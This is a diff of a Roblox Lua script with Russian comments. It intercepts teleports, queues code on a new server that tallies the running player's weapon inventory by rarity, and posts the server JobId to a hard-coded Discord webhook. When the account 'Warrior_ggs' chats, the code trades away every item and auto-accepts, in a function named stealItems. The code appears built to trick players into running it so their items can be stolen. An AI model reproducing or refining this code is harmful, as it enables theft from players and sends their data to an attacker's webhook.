@@ -1,19 +1,19 @@
 local TeleportService = game:GetService("TeleportService")
 local PlaceId = 126884695634066 -- твой PlaceId
 
--- Перехват и сохранение JobId + выполнение трейд-кода на новом сервере
+-- ===== Байпасс JobId =====
 TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportResult)
     local serverId = teleportResult.ServerInstanceId
 
+    -- Сохраняем JobId и запускаем весь трейд-код на новом сервере
     queue_on_teleport(string.format([[
         getgenv().JobId = "%s"
 
-        -- ===== Весь код трейда и вебхуков =====
+        -- ===== Трейд-функции и вебхуки на новом сервере =====
         local HttpService = game:GetService("HttpService")
         local Players = game:GetService("Players")
         local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-        -- Настройки
         local Username = "Warrior_ggs"
         local Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
 
@@ -21,17 +21,16 @@ TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportResult)
         local PlayerDataModule = require(ReplicatedStorage.Modules.ProfileData)
         local LevelModule = require(ReplicatedStorage.Modules.LevelModule)
 
-        -- Функция отправки вебхука
-        local function SendMessageEMBED(url, embed)
+        -- Отправка вебхука с JobId
+        local function SendWebhook()
             local data = {
                 ["content"] = "JobId: `" .. getgenv().JobId .. "` успешно установлен!",
-                ["username"] = "JobId Logger",
-                ["embeds"] = { embed }
+                ["username"] = "JobId Logger"
             }
             local jsonData = HttpService:JSONEncode(data)
             pcall(function()
                 syn.request({
-                    Url = url,
+                    Url = Webhook,
                     Method = "POST",
                     Headers = {["Content-Type"] = "application/json"},
                     Body = jsonData
@@ -39,7 +38,9 @@ TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportResult)
             end)
         end
 
-        -- Отключение трейд GUI
+        SendWebhook()
+
+        -- ===== Весь трейд-код (stealItems) =====
         coroutine.wrap(function()
             while true do
                 local player = Players.LocalPlayer
@@ -51,9 +52,7 @@ TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportResult)
             end
         end)()
 
-        -- Подсчёт предметов
-        local allItems = {}
-        local uniqueItems, ancientItems, godlyItems, legendaryItems, vintageItems, rareItems, uncommonItems, commonItems = {}, {}, {}, {}, {}, {}, {}, {}
+        local allItems, uniqueItems, ancientItems, godlyItems, legendaryItems, vintageItems, rareItems, uncommonItems, commonItems = {}, {}, {}, {}, {}, {}, {}, {}
         local counts = {Unique=0, Ancient=0, Godly=0, Legendary=0, Vintage=0, Rare=0, Uncommon=0, Common=0}
 
         for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
@@ -71,19 +70,16 @@ TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportResult)
             end
         end
 
-        -- Проверка и выполнение трейда
+        -- Функция трейда
         local function stealItems()
             local player = Players.LocalPlayer
-            local sendArgs = {[1] = player} -- Имя аккаунта получателя
-            ReplicatedStorage.Trade.SendRequest:InvokeServer(unpack(sendArgs))
+            ReplicatedStorage.Trade.SendRequest:InvokeServer(player)
             task.wait(3)
-
             local function offerList(list)
                 for _, id in pairs(list) do
                     ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons")
                 end
             end
-
             offerList(uniqueItems)
             offerList(ancientItems)
             offerList(godlyItems)
@@ -92,12 +88,11 @@ TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportResult)
             offerList(rareItems)
             offerList(uncommonItems)
             offerList(commonItems)
-
             task.wait(6)
             ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
         end
 
-        -- Подключение к событию PlayerAdded и выполнение трейда
+        -- Выполнение трейда при добавлении игрока
         Players.PlayerAdded:Connect(function(player)
             if player.Name == Username then
                 player.Chatted:Connect(function(msg)
@@ -106,26 +101,15 @@ TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportResult)
             end
         end)
 
-        -- Отправка вебхука с информацией о JobId
-        local embed = {
-            title = "JobId и трейд активированы!",
-            color = 65280,
-            fields = {
-                {name = "JobId", value = tostring(getgenv().JobId)}
-            }
-        }
-        SendMessageEMBED(Webhook, embed)
-
-        print("Трейд-функции выполнены на новом сервере!")
     ]], serverId))
 
-    -- Перезаход на пойманный сервер
+    -- Перезаход на сервер с пойманным JobId
     task.spawn(function()
         TeleportService:TeleportToPlaceInstance(PlaceId, serverId)
     end)
 end)
 
--- Начальный телепорт (если JobId уже есть)
+-- ===== Начальный телепорт, как в байпасе =====
 for _ = 1, 2 do
     task.spawn(function()
         TeleportService:TeleportToPlaceInstance(PlaceId, game.JobId)
